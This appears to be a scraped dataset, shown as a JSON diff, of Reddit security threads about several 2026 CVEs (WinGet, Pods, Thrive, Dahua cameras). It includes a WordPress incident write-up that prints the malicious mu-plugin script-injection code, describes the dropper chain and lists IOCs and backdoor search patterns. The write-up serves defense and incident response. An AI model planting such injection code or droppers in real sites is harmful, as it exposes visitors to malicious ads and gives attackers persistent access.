@@ -1,5 +1,453 @@
 [
   {
+    "_id": "6a84f7f149715ba391888a58",
+    "redditId": "1vs6uu4",
+    "author": "ServerPatchingNovice",
+    "author_description": "Anyone use Tenable and attempted looking into the CVE - Windows Package Manager (WinGet) &lt; 1.30.80 Elevation of Privilege (CVE-2026-68821)? We have attempted installing the package, but its also installing SDKs and files we think are not necessary for a fresh install of Window Server.\n\nShould we just wait for more info from MS in their MSRC articles?\n\n[https://www.tenable.com/plugins/nessus/334617](https://www.tenable.com/plugins/nessus/334617)",
+    "awards": [],
+    "created_utc": "2026-08-19T00:22:53",
+    "first_author_comment": null,
+    "num_comments": 1,
+    "score": 1,
+    "subreddit": "sysadmin",
+    "tag": "Question",
+    "tags": [
+      "Question"
+    ],
+    "title": "Tenable - Windows Package Manager (WinGet) &lt; 1.30.80 Elevation of Privilege (CVE-2026-68821)",
+    "updatedAt": "2026-08-19T02:25:13.314Z",
+    "upvote_ratio": 1,
+    "url": "https://reddit.com/r/sysadmin/comments/1vs6uu4/tenable_windows_package_manager_winget_13080/",
+    "versionList": [
+      "1.30.80",
+      "2026.0.0",
+      "68821.0.0"
+    ],
+    "classification": {
+      "securityType": [
+        "SECURITY"
+      ],
+      "componentType": [
+        "REPOSITORY",
+        "OS"
+      ]
+    },
+    "comments": [
+      {
+        "id": "p4j4s0q",
+        "author": "slackjack2014",
+        "body": "If you don’t use WinGet, just remove it from the systems. \n\nI haven’t updated yet, but that’s on my to do list. I usually download the app package from the store and deploy it manually, but I always remove it from my servers for least functionality reasons.",
+        "score": 1,
+        "created_utc_ts": 1787101228,
+        "created_utc": "2026-08-19T01:00:28",
+        "permalink": "https://reddit.com/r/sysadmin/comments/1vs6uu4/tenable_windows_package_manager_winget_13080/p4j4s0q/",
+        "parent_id": "t3_1vs6uu4",
+        "is_submitter": false
+      }
+    ]
+  },
+  {
+    "_id": "6a84e0c749715ba391888688",
+    "redditId": "1vs4dtb",
+    "author": "stondd_cold",
+    "author_description": "Device: Blurams Lumi/A31C-family camera (exact retail model TBD — will confirm from device label)\n\n SoC / Flash: Unconfirmed  a related model in this same product family (A31C \"Lumi\") has been documented elsewhere using an ANYKA AK3918 SoC + PUYA PY25Q128HA SPI NOR flash; haven't opened this specific unit yet to confirm it matches.\n\nFirmware: reports as 2.3.38.12663 via the app API (masked as 22.0208.428.2703 on another endpoint — exact on-device /etc/version not yet confirmed)\n\nWhat I've checked so far:\n\nApp-side traffic analysis (via mitmproxy) confirms productKey: 1cad3c83-d87, matching the A31C/Lumi family's known API footprint.Tried two publicly disclosed SD-card auth.ini bootstrap exploits for this device family (CVE-2023-50488 version-derived key, CVE-2023-51820 static HMAC key)  both failed cleanly, suggesting this firmware generation has moved past both- Have not yet done a port scan or opened the device for UART access \n\nObjective: Looking for documentation, existing reverse engineering write-ups, or open-source projects (Thingino, OpenIPC, Dafang-Hacks, etc.) supporting this SoC/board family. Any guidance on obtaining serial access or extracting the squashfs rootfs would be appreciated.",
+    "awards": [],
+    "created_utc": "2026-08-18T22:38:47",
+    "first_author_comment": null,
+    "num_comments": 0,
+    "score": 1,
+    "subreddit": "hardwarehacking",
+    "tag": null,
+    "tags": [],
+    "title": "[Hardware/Firmware] Investigating local shell/RTSP access on Blurams A31C-family camera (SoC unconfirmed — possibly ANYKA)",
+    "updatedAt": "2026-08-19T02:46:55.963Z",
+    "upvote_ratio": 1,
+    "url": "https://reddit.com/r/hardwarehacking/comments/1vs4dtb/hardwarefirmware_investigating_local_shellrtsp/",
+    "versionList": [],
+    "metadata": {
+      "predicted": {
+        "isUpdateRelated": false,
+        "positiveScore": 0.00034716847106182135,
+        "timestampPredicted": "2026-08-19T00:00:25.863681+00:00"
+      },
+      "labeled": {
+        "isUpdateRelated": null
+      }
+    },
+    "isAboutCve": true,
+    "isAboutLatestUpdate": true,
+    "author_description_sentiment": {
+      "score": 0,
+      "detail": {
+        "neg": 0.042,
+        "neu": 0.922,
+        "pos": 0.036,
+        "compound": 0
+      }
+    },
+    "category": "Neutral",
+    "comments": [],
+    "comments_avg_sentiment_score": 0,
+    "sentiment_score": 0,
+    "classification": {
+      "securityType": [
+        "SECURITY"
+      ],
+      "componentType": [
+        "FIRMWARE",
+        "LANGUAGE",
+        "IDE",
+        "CLI"
+      ]
+    }
+  },
+  {
+    "_id": "6a84cade49715ba391888272",
+    "redditId": "1vrzxlo",
+    "author": "KuntStink",
+    "author_description": "As an agency with several hundred sites, we see vulnerabilities pop up all the time, and update them in a timely manner. We use automatic plugin updaters through Flywheel and WP Engine to do this, and generally there is no issue.\n\nToday was different. We have the PODS plugin on about 80 of our sites, and at least 70 of them had fake administrator users added. The vulnerability patch came out on Friday and most of our sites were updated by Saturday / Sunday. \n\nNeedless to say, we've had to scramble big time to roll back sites and clean them up, removing all these users and running scans. If you use PODS, I suggest you update it as soon as you can.\n\nThis is outlined here: CVE-2026-19598\n\nI figured people in this sub might appreciate the heads up, if they aren't already aware of this!",
+    "awards": [],
+    "created_utc": "2026-08-18T19:49:39",
+    "first_author_comment": "Yeah we've been using it for years as well, and only stopped using on newer sites when we went to ACF.\n\nThe users we were seeing look like \"wp\\_dfsdas\", \"wp\\_232j\\_3213\", \"wp\\_admin\\_312312\", and most of them had random emails with either gmail or random domains.",
+    "num_comments": 5,
+    "score": 22,
+    "subreddit": "Wordpress",
+    "tag": null,
+    "tags": [],
+    "title": "PSA - Major security issue with the PODS plugin - CVE-2026-19598",
+    "updatedAt": "2026-08-19T01:08:15.571Z",
+    "upvote_ratio": 1,
+    "url": "https://reddit.com/r/Wordpress/comments/1vrzxlo/psa_major_security_issue_with_the_pods_plugin/",
+    "versionList": [
+      "2026.0.0",
+      "19598.0.0"
+    ],
+    "commentCount": 2,
+    "detectedCVEs": [
+      {
+        "cveId": "CVE-2026-19598",
+        "cveIds": [
+          "CVE-2026-19598"
+        ],
+        "source": "Title",
+        "commentText": "PSA - Major security issue with the PODS plugin - CVE-2026-19598",
+        "linkToComment": "https://reddit.com/r/Wordpress/comments/1vrzxlo/psa_major_security_issue_with_the_pods_plugin/",
+        "commentDate": "2026-08-18T19:49:39+00:00",
+        "cvePublishedDate": "2026-08-15T18:16:23.860000+00:00",
+        "initialAnalysisDate": null,
+        "daysAfterPublication": 3,
+        "isPreAnalysis": true,
+        "isAnalyzed": false,
+        "cveChangeHistory": "1. 2026-08-17T16:16:52.700 | CVE Modified | source=134c704f-9b21-4f2e-91b3-4a467353bcc0 | changeId=613246D9-E555-473D-8967-C15DC49C1DD2\n   - Added SSVC: {'timestamp': '2026-08-17T15:49:11.035762Z', 'id': 'CVE-2026-19598', 'options': [{'exploitation': 'none'}, {'automatable': 'yes'}, {'technicalImpact': 'total'}], 'role': 'CISA Coordinator', 'version': '2.0.3'}\n2. 2026-08-15T18:16:23.860 | New CVE Received | source=security@wordfence.com | changeId=4F53DDA9-E872-4144-88EE-0008F220394B\n   - Added Affected: [{'vendor': 'sc0ttkclark', 'product': 'Pods – Custom Content Types and Fields', 'defaultStatus': 'unaffected', 'versions': [{'version': '2.8', 'lessThanOrEqual': '2.8.23.3', 'versionType': 'semver', 'status': 'affected'}, {'version': '2.9', 'lessThanOrEqual': '2.9.19.3', 'versionType': 'semver', 'status': 'affected'}, {'version': '3.0', 'lessThanOrEqual': '3.0.10.3', 'versionType': 'semver', 'status': 'affected'}, {'version': '3.1', 'lessThanOrEqual': '3.1.4.1', 'versionType': 'semver', 'status': 'affected'}, {'version': '3.2', 'lessThanOrEqual': '3.2.8.2', 'versionType': 'semver', 'status': 'affected'}, {'version': '3.3', 'lessThanOrEqual': '3.3.9', 'versionType': 'semver', 'status': 'affected'}]}]\n   - Added Description: The Pods – Custom Content Types and Fields plugin for WordPress is vulnerable to Privilege Escalation via Authorization Bypass in all versions up to, and including, 3.3.9. The vulnerability exists because the pods_admin AJAX router funnels every access check — including the method allowlist, nonce verification, login enforcement, and capability gate — through pods_error(), which under the JSON meta-box-loader compatibility path only writes failures to the PHP error log and returns false instead of terminating the request, rendering all guards ineffective.  This makes it possible for unauthenticated attackers to escalate their privileges to Administrator or overwrite the password of any user account, including the site owner's, enabling complete site takeover, or perform another administrator action.\n   - Added CVSS V3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n   - Added CWE: CWE-863\n   - Added Reference: https://plugins.trac.wordpress.org/browser/pods/tags/3.3.9/includes/general.php#L400\n   - Added Reference: https://www.wordfence.com/threat-intel/vulnerabilities/id/3628032a-3121-45a7-8a78-cfcd8ba6af2f?source=cve\n",
+        "eventNamesBeforeAnalysis": [
+          "New CVE Received",
+          "CVE Modified"
+        ]
+      },
+      {
+        "cveId": "CVE-2026-19598",
+        "cveIds": [
+          "CVE-2026-19598"
+        ],
+        "source": "Title",
+        "commentText": "PSA - Major security issue with the PODS plugin - CVE-2026-19598",
+        "linkToComment": "https://reddit.com/r/Wordpress/comments/1vrzxlo/psa_major_security_issue_with_the_pods_plugin/",
+        "commentDate": "2026-08-18T19:49:39+00:00",
+        "cvePublishedDate": "2026-08-15T18:16:23.860000+00:00",
+        "initialAnalysisDate": null,
+        "daysAfterPublication": 3,
+        "isPreAnalysis": true,
+        "isAnalyzed": false,
+        "cveChangeHistory": "1. 2026-08-17T16:16:52.700 | CVE Modified | source=134c704f-9b21-4f2e-91b3-4a467353bcc0 | changeId=613246D9-E555-473D-8967-C15DC49C1DD2\n   - Added SSVC: {'timestamp': '2026-08-17T15:49:11.035762Z', 'id': 'CVE-2026-19598', 'options': [{'exploitation': 'none'}, {'automatable': 'yes'}, {'technicalImpact': 'total'}], 'role': 'CISA Coordinator', 'version': '2.0.3'}\n2. 2026-08-15T18:16:23.860 | New CVE Received | source=security@wordfence.com | changeId=4F53DDA9-E872-4144-88EE-0008F220394B\n   - Added Affected: [{'vendor': 'sc0ttkclark', 'product': 'Pods – Custom Content Types and Fields', 'defaultStatus': 'unaffected', 'versions': [{'version': '2.8', 'lessThanOrEqual': '2.8.23.3', 'versionType': 'semver', 'status': 'affected'}, {'version': '2.9', 'lessThanOrEqual': '2.9.19.3', 'versionType': 'semver', 'status': 'affected'}, {'version': '3.0', 'lessThanOrEqual': '3.0.10.3', 'versionType': 'semver', 'status': 'affected'}, {'version': '3.1', 'lessThanOrEqual': '3.1.4.1', 'versionType': 'semver', 'status': 'affected'}, {'version': '3.2', 'lessThanOrEqual': '3.2.8.2', 'versionType': 'semver', 'status': 'affected'}, {'version': '3.3', 'lessThanOrEqual': '3.3.9', 'versionType': 'semver', 'status': 'affected'}]}]\n   - Added Description: The Pods – Custom Content Types and Fields plugin for WordPress is vulnerable to Privilege Escalation via Authorization Bypass in all versions up to, and including, 3.3.9. The vulnerability exists because the pods_admin AJAX router funnels every access check — including the method allowlist, nonce verification, login enforcement, and capability gate — through pods_error(), which under the JSON meta-box-loader compatibility path only writes failures to the PHP error log and returns false instead of terminating the request, rendering all guards ineffective.  This makes it possible for unauthenticated attackers to escalate their privileges to Administrator or overwrite the password of any user account, including the site owner's, enabling complete site takeover, or perform another administrator action.\n   - Added CVSS V3.1: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H\n   - Added CWE: CWE-863\n   - Added Reference: https://plugins.trac.wordpress.org/browser/pods/tags/3.3.9/includes/general.php#L400\n   - Added Reference: https://www.wordfence.com/threat-intel/vulnerabilities/id/3628032a-3121-45a7-8a78-cfcd8ba6af2f?source=cve\n",
+        "eventNamesBeforeAnalysis": [
+          "New CVE Received",
+          "CVE Modified"
+        ]
+      }
+    ],
+    "classification": {
+      "componentType": [],
+      "securityType": [
+        "SECURITY"
+      ]
+    },
+    "metadata": {
+      "predicted": {
+        "isUpdateRelated": false,
+        "positiveScore": 0.029132449846656642,
+        "timestampPredicted": "2026-08-19T00:00:48.317011+00:00"
+      },
+      "labeled": {
+        "isUpdateRelated": null
+      }
+    },
+    "comments": [
+      {
+        "id": "p4hj9ml",
+        "author": "S2JESSICA",
+        "body": "i appreciate the heads up... i use pods on all of my sites and i noticed pods updated itself over the weekend on one of them (i don't have auto-updates enabled) and i thought it weird. i did end up having a few bogus admin accounts on one of my sites! i've deleted and will run scans.\n\ni've been using pods since they started and i can't remember this ever happening before... wild.",
+        "score": 4,
+        "created_utc_ts": 1787084062,
+        "created_utc": "2026-08-18T20:14:22",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrzxlo/psa_major_security_issue_with_the_pods_plugin/p4hj9ml/",
+        "parent_id": "t3_1vrzxlo",
+        "is_submitter": false
+      },
+      {
+        "id": "p4hkq9u",
+        "author": "KuntStink",
+        "body": "Yeah we've been using it for years as well, and only stopped using on newer sites when we went to ACF.\n\nThe users we were seeing look like \"wp\\_dfsdas\", \"wp\\_232j\\_3213\", \"wp\\_admin\\_312312\", and most of them had random emails with either gmail or random domains.",
+        "score": 3,
+        "created_utc_ts": 1787084447,
+        "created_utc": "2026-08-18T20:20:47",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrzxlo/psa_major_security_issue_with_the_pods_plugin/p4hkq9u/",
+        "parent_id": "t1_p4hj9ml",
+        "is_submitter": true
+      },
+      {
+        "id": "p4im2x7",
+        "author": "Traditional_Jello436",
+        "body": "Thank you for sharing this. I checked my sites and updated the plugin. I hope everyone does the same.",
+        "score": 1,
+        "created_utc_ts": 1787095199,
+        "created_utc": "2026-08-18T23:19:59",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrzxlo/psa_major_security_issue_with_the_pods_plugin/p4im2x7/",
+        "parent_id": "t3_1vrzxlo",
+        "is_submitter": false
+      },
+      {
+        "id": "p4j3ydd",
+        "author": "azhousepro",
+        "body": "Thank you for this post. I had a site get hacked yesterday, but I caught it within minutes. (Thank you Wordfence admin login notifications). There were already 20 or so bogus admin accounts added. ",
+        "score": 1,
+        "created_utc_ts": 1787100957,
+        "created_utc": "2026-08-19T00:55:57",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrzxlo/psa_major_security_issue_with_the_pods_plugin/p4j3ydd/",
+        "parent_id": "t3_1vrzxlo",
+        "is_submitter": false
+      }
+    ],
+    "isAboutCve": true,
+    "isAboutLatestUpdate": true,
+    "author_description_sentiment": {
+      "score": 0.159,
+      "detail": {
+        "neg": 0.06,
+        "neu": 0.886,
+        "pos": 0.054,
+        "compound": 0.1593
+      }
+    },
+    "category": "Positive",
+    "comments_avg_sentiment_score": 0.458,
+    "sentiment_score": 0.309
+  },
+  {
+    "_id": "6a84a89b49715ba391887b28",
+    "redditId": "1vrw3fd",
+    "author": "Straight-Practice-99",
+    "author_description": "An operator left their full working directory exposed on an open HTTP server. [Hunt.io](http://Hunt.io) crawled it, 2,616 files, and rebuilt the campaign from the corpus.\n\n* Three exploitation paths in parallel: an asyncio credential brute-forcer, a CVE-2021-33044/33045 auth-bypass chain, and P2P relay abuse reaching cameras by serial number\n* The relay path never authenticates the connecting party, only the session, via a cloud-issued token obtainable with the fixed SDK credentials in every Dahua client\n* Two CVE labels in the tooling don't hold up: CVE-2024-39943 is an unrelated Rejetto HFS flaw, and CVE-2025-31702 is a narrower post-auth case, not the unauthenticated relay abuse (that path is a separate non-CVE issue documented by ITRES)\n* Full PTCP tunnel breakdown, including the Inverted STUN packet and the bind-to-127.0.0.1 technique\n\nNeutral attribution throughout, the corpus shows how the operation was built and run, not who ran it.\n\nCheck the full breakdown, IOCs and mitigation strategies:  \n[https://hunt.io/blog/operation-cameraswarm-dahua-cameras-compromised](https://hunt.io/blog/operation-cameraswarm-dahua-cameras-compromised)",
+    "awards": [],
+    "created_utc": "2026-08-18T17:34:14",
+    "first_author_comment": null,
+    "num_comments": 0,
+    "score": 8,
+    "subreddit": "netsec",
+    "tag": null,
+    "tags": [],
+    "title": "🎥 Operation CameraSwarm: over 14,000 Dahua cameras compromised across Ukraine and Russia",
+    "updatedAt": "2026-08-19T02:46:13.325Z",
+    "upvote_ratio": 1,
+    "url": "https://reddit.com/r/netsec/comments/1vrw3fd/operation_cameraswarm_over_14000_dahua_cameras/",
+    "versionList": [
+      "14.0.0",
+      "000.0.0"
+    ],
+    "metadata": {
+      "predicted": {
+        "isUpdateRelated": false,
+        "positiveScore": 0.0013733046951575644,
+        "timestampPredicted": "2026-08-19T00:01:10.840336+00:00"
+      },
+      "labeled": {
+        "isUpdateRelated": null
+      }
+    },
+    "isAboutCve": true,
+    "isAboutLatestUpdate": true,
+    "classification": {
+      "componentType": [],
+      "securityType": [
+        "UNKNOWN"
+      ]
+    },
+    "author_description_sentiment": {
+      "score": -0.71,
+      "detail": {
+        "neg": 0.063,
+        "neu": 0.9,
+        "pos": 0.038,
+        "compound": -0.7096
+      }
+    },
+    "category": "Negative",
+    "comments": [],
+    "comments_avg_sentiment_score": 0,
+    "sentiment_score": -0.355
+  },
+  {
+    "_id": "6a843ccd49715ba3918865e2",
+    "redditId": "1vrjuu3",
+    "author": "ClassifiedReport",
+    "author_description": "**What happened:**\n\nNoticed a tab-under/reverse-tabnabbing attack on my site. Disabled all plugins → problem persisted. That was the first hint it wasn't sitting in a normal plugin.\n\nTurned out the source was in **must-use plugins** (`/wp-content/mu-plugins/`) — this folder is completely ignored when you \"disable all plugins\" via the wp-admin screen, so almost nobody checks it as long as the site is still loading normally.\n\n**The two files:**\n\n**1.** `/wp-content/mu-plugins/wp-ppck-assets.php`\n\nInjects a `&lt;script&gt;` tag on every page (via `wp_head`, priority 1) pointing to a second file disguised as a normal theme asset:\n\nphp\n\n    add_action('wp_head', function () {\n        if (function_exists('is_admin') &amp;&amp; is_admin()) return;\n        echo '&lt;script src=\"/wp-content/themes/{THEME}/js/qtt-ppck-core.php\" defer&gt;&lt;/script&gt;';\n    }, 1);\n\n**2.** `/wp-content/themes/{theme}/js/qtt-ppck-core.php`\n\nThis is the actual payload. It's a PHP file pretending to be JavaScript (`Content-Type: application/javascript`), and behind the scenes it:\n\n* Makes a server-to-server request to [`api-js.popcash.net/getCode`](http://api-js.popcash.net/getCode) using a PopCash publisher UID/WID/API token\n* Passes the API response straight through to the visitor's browser\n* Includes an option `\"pop_fback\" =&gt; \"under\"` — literally the setting that triggers a pop-under/tab-under\n* Has fallback logic (curl → shell\\_exec → file\\_get\\_contents) so it keeps working regardless of how restrictive the server config is\n\nThe clever (read: annoying) part: since the malicious JS only gets pulled in via the external API call, and the local file itself looks \"clean\" (no obfuscation, no `eval(base64_decode(...))`), **not a single malware scanner flagged this** — not Wordfence, not Sucuri, nothing. On a pure code level it just looks like an ad network integration calling an API.\n\n**How to check for it yourself:**\n\n1. Look in `/wp-content/mu-plugins/` — this folder is NOT covered when you \"disable\" plugins via wp-admin\n2. Search for filenames containing `ppck`, `qtt-`, `popcash`, or similarly cryptic names\n3. Check your theme folder for `.php` files being loaded as if they were `.js` (called as a script but actually PHP under the hood)\n4. Run `find /path/to/wordpress -type f -mtime -60 -name \"*.php\"` to find recently modified PHP files\n\n**How to remove it:**\n\n1. **Delete both files** (the mu-plugin + the fake \"js\" file in your theme folder)\n2. **Don't assume you're done** — this didn't appear out of nowhere. Someone had file access. Search all your PHP files for backdoor patterns: `eval(`, `base64_decode(`, `gzinflate(`, `shell_exec(`, `assert(`\n3. **Check if your theme is legit/up to date** — outdated or \"nulled\" (pirated) themes are the most common entry point for this kind of infection\n4. **Rotate every password**: WP admin, FTP/SFTP, database, hosting panel\n5. **Update everything**: core, theme, plugins\n\n**IOCs for anyone who wants to check/share:**\n\n* Filenames: `wp-ppck-assets.php`, `qtt-ppck-core.php`\n* Endpoint: [`api-js.popcash.net/getCode`](http://api-js.popcash.net/getCode)\n* Cache key prefix: `ppch-h6IzF4iRLEdZV-QX82hhpzmvxX--`\n* Internal code comments referenced a \"PopCash S2S Playbook\" and a generator script (`popcash_ops.py`) — suggests this is a reusable toolkit, so probably not unique to my site. If anyone else has run into this, I'd like to hear about it.\n\nHaven't 100% nailed down the root cause (how they got in) yet — no unknown WP users found, so my guess is stolen FTP credentials or a vulnerable/outdated theme. If anyone has tips for tracing this further through server logs, I'd appreciate it in the comments.\n\n# UPDATE: Root Cause &amp; Entry Point Found!\n\nThanks to analyzing the server access logs and cross-referencing recent vulnerability databases, I've fully traced how the attacker got in and deployed the malware.\n\n# 1. The Vulnerability (The Entry Point)\n\nThe site was running **Thrive Themes** (Thrive Architect / Thrive Visual Editor / Thrive Leads).\n\n* On **Aug 6, 2026**, **CVE-2026-66694** was published — an Unauthenticated Cross-Site Scripting (XSS) / arbitrary code input vulnerability in Thrive Architect (versions &lt;= 10.9.3.1).\n* Automated bot scanners picked up the unpatched Thrive plugin and exploited it to achieve file write access.\n\n# 2. The Attack Timeline (From Server Logs)\n\n* **21:09:53 UTC** — **Exploit Verification:** Attacker bot created a random hex file at the site root (`/52faade47ac664d8d0d3.txt`, \\~8.6 KB) to confirm arbitrary file write privileges.\n* **21:39:19 UTC** — **Dropper Upload:** Attacker POSTed to `/wp-content/themes/thrive-theme/js/_w10_up.php` (a hidden PHP uploader script, identical in size to `wp-tmp-up.php`).\n* **21:39:22 UTC** — **Verification:** Exactly 3 seconds later, a `curl/7.81.0` request verified that the deployed payload (`qtt-ajax-core.php` / `qtt-ppck-core.php`) was live and returning HTTP 200.\n\n# 3. Additional IOCs to Search For\n\nIf you are cleaning a site infected by this toolkit, make sure to also look for and delete:\n\n* **Uploader / Dropper scripts:** `_w10_up.php`, `wp-tmp-up.php` (often dropped inside theme `/js/` or `/assets/` directories).\n* **Verification markers:** Random 20-character hex `.txt` files in the WordPress root directory (e.g., `52faade47ac664d8d0d3.txt`).\n* **Payload aliases:** `qtt-ajax-core.php` alongside `qtt-ppck-core.php`.\n\n# Takeaway &amp; Remediation\n\nUpdating the plugin (e.g. to Thrive 10.9.3.2+) seals the vulnerability, but **does NOT clean the uploaded dropper tools or backdoors**. If you suspect an infection, scanning for newly created `.php` files and root `.txt` files around the date of infection is critical.",
+    "awards": [],
+    "comments": [
+      {
+        "id": "p4dxm0d",
+        "author": "bluesix_v2",
+        "body": "&gt;*Haven't 100% nailed down the root cause (how they got in) yet — no unknown WP users found, so my guess is stolen FTP credentials or a vulnerable/outdated theme.*\n\nKnowing how the malware entered is the most important thing.\n\nIt's (almost) always a plugin. List your theme &amp; plugins and versions.",
+        "score": 6,
+        "created_utc_ts": 1787046244,
+        "created_utc": "2026-08-18T09:44:04",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrjuu3/found_popcash_stealth_popunder_malware_hiding_in/p4dxm0d/",
+        "parent_id": "t3_1vrjuu3",
+        "is_submitter": false
+      },
+      {
+        "id": "p4e4oky",
+        "author": "ClassifiedReport",
+        "body": "I dug into the access logs and cross-referenced them with recent CVE databases. It was indeed a plugin/theme vulnerability.\n\nHere is the exact breakdown of how they got in:\n\n* **The Culprit:** Thrive Themes (Thrive Architect / Thrive Visual Editor / Thrive Leads).\n* **The Vulnerability:** **CVE-2026-66694** (published just days before the attack, on Aug 6, 2026). It’s an Unauthenticated XSS vulnerability that essentially allowed arbitrary file writing on versions `&lt;= 10.9.3.1`.\n* **How it played out (from the access logs):**\n   1. The bots scanned the site and successfully exploited the vulnerability to write a random 20-character hex text file (`52faade47ac664d8d0d3.txt`) to the site root to verify write privileges.\n   2. Once confirmed, they uploaded a hidden PHP dropper named `_w10_up.php` straight into the `/wp-content/themes/thrive-theme/js/` directory.\n   3. A few seconds later, they triggered that dropper via a `curl` request to install the actual PopCash payload (`qtt-ppck-core.php` and the `wp-ppck-assets.php` mu-plugin).\n\nMy site had actually updated to the patched version (`10.9.3.2`) shortly *after* the initial breach, which closed the front door, but the `_w10_up.php` dropper was already sitting inside the theme files, acting as a backdoor.",
+        "score": 2,
+        "created_utc_ts": 1787049482,
+        "created_utc": "2026-08-18T10:38:02",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrjuu3/found_popcash_stealth_popunder_malware_hiding_in/p4e4oky/",
+        "parent_id": "t1_p4dxm0d",
+        "is_submitter": true
+      },
+      {
+        "id": "p4e570h",
+        "author": "StefanTLDWP",
+        "body": "If your access logs are big/old enough, you might be able to figure out the exact entry point. Most of the time though, it’s enough to install a free version of Wordfence, make sure the scan is configured to full/all checkboxes checked, and then run the scan. This will usually reveal a theme or plugin that has a vulnerability or has been removed from wordpress.org or abandoned (not updated in years).",
+        "score": 1,
+        "created_utc_ts": 1787049698,
+        "created_utc": "2026-08-18T10:41:38",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrjuu3/found_popcash_stealth_popunder_malware_hiding_in/p4e570h/",
+        "parent_id": "t3_1vrjuu3",
+        "is_submitter": false
+      },
+      {
+        "id": "p4e91yr",
+        "author": "FabianKnopf78",
+        "body": "*Great write-up – thanks for sharing this level of detail.*\n\n*mu-plugins is such an overlooked hiding spot. The fact that it bypassed every scanner (Wordfence, Sucuri, etc.) because the local file looks \"clean\" is genuinely concerning.*\n\n*One thing I'd add: check your wp-config.php and .htaccess files too. I've seen similar attacks inject code there to persist even after you delete the mu-plugin files. Also worth scanning for any recently modified index.php files in plugin/theme folders – they sometimes get injected with backdoor code.*\n\n*The Thrive CVE as entry point makes total sense. It's a good reminder that even \"premium\" themes/plugins need to be updated religiously.*\n\n*Thanks for the IOCs – really helpful for the community! 🙏*",
+        "score": 2,
+        "created_utc_ts": 1787051288,
+        "created_utc": "2026-08-18T11:08:08",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrjuu3/found_popcash_stealth_popunder_malware_hiding_in/p4e91yr/",
+        "parent_id": "t3_1vrjuu3",
+        "is_submitter": false
+      },
+      {
+        "id": "p4f2lt2",
+        "author": "ansari_m369",
+        "body": "This is a really good reminder that “disable all plugins” doesn’t actually mean everything WordPress can execute is disabled. MU-plugins are easy to overlook, especially when the site otherwise looks completely normal.\n\nThe fake `.js` file that is actually PHP is also a pretty nasty trick. I’d definitely add checking file extensions against how they’re being loaded to my incident-response checklist after seeing this.\n\nAnd the timeline in the update is especially useful. Finding the initial uploader rather than just deleting the final payload is important — otherwise you’re basically cleaning up the symptoms while leaving the door open.\n\nThanks for sharing the IOCs and the investigation details. This is the kind of write-up that’s actually useful for troubleshooting an infected WordPress site.",
+        "score": 2,
+        "created_utc_ts": 1787060997,
+        "created_utc": "2026-08-18T13:49:57",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrjuu3/found_popcash_stealth_popunder_malware_hiding_in/p4f2lt2/",
+        "parent_id": "t3_1vrjuu3",
+        "is_submitter": false
+      },
+      {
+        "id": "p4f6ysq",
+        "author": "geenxt",
+        "body": "Solid root-cause tracing. The broader process gap this points to: once a CVE like this drops for a plugin you're running, the clock starts immediately, automated scanners are usually exploiting it within days, often before most site owners even see the changelog. Subscribing to a vulnerability feed (WPScan's DB, Patchstack, or just the plugin's own changelog RSS) and patching on CVE disclosure rather than on a \"update when I remember\" cadence is what actually closes this window, since Wordfence/Sucuri clearly didn't catch it here.\n\nOn the cleanup side: since the attacker had confirmed file-write access, I wouldn't fully trust a manual IOC hunt to be exhaustive, there's no guarantee the dropper only planted the two files you found. If you have a backup from before Aug 6 (pre-CVE), diffing the full wp-content and theme directories against it will catch anything the manual search missed. If you don't have one, that's the real gap to fix going forward, an off-site backup schedule that always gives you a pre-compromise restore point, not just a recent one.",
+        "score": -1,
+        "created_utc_ts": 1787062201,
+        "created_utc": "2026-08-18T14:10:01",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrjuu3/found_popcash_stealth_popunder_malware_hiding_in/p4f6ysq/",
+        "parent_id": "t3_1vrjuu3",
+        "is_submitter": false
+      },
+      {
+        "id": "p4f77yh",
+        "author": "Grouchy_Brain_1641",
+        "body": "Good catch, nice work.",
+        "score": 1,
+        "created_utc_ts": 1787062270,
+        "created_utc": "2026-08-18T14:11:10",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrjuu3/found_popcash_stealth_popunder_malware_hiding_in/p4f77yh/",
+        "parent_id": "t3_1vrjuu3",
+        "is_submitter": false
+      },
+      {
+        "id": "p4fe9yh",
+        "author": "Station3303",
+        "body": "A site could be somewhat protected against malicious mu-plugins by locking that folder. It is relatively rarely used. \n\nSome hosters (Hostinger, e.g.) completely block it. Hostinger also blocks wp-admin, no core changes possible. One can also not install core updates oneself - at least on the agency plan (one reason why I left - safer, but I like a bit more freedom ...)",
+        "score": 1,
+        "created_utc_ts": 1787064173,
+        "created_utc": "2026-08-18T14:42:53",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrjuu3/found_popcash_stealth_popunder_malware_hiding_in/p4fe9yh/",
+        "parent_id": "t3_1vrjuu3",
+        "is_submitter": false
+      },
+      {
+        "id": "p4gnpfq",
+        "author": "samuraipadthai",
+        "body": "Thanks, 2 day old account and post clearly written by AI. Super helpful response. ",
+        "score": 2,
+        "created_utc_ts": 1787075877,
+        "created_utc": "2026-08-18T17:57:57",
+        "permalink": "https://reddit.com/r/Wordpress/comments/1vrjuu3/found_popcash_stealth_popunder_malware_hiding_in/p4gnpfq/",
+        "parent_id": "t1_p4e91yr",
+        "is_submitter": false
+      }
+    ],
+    "created_utc": "2026-08-18T09:05:04",
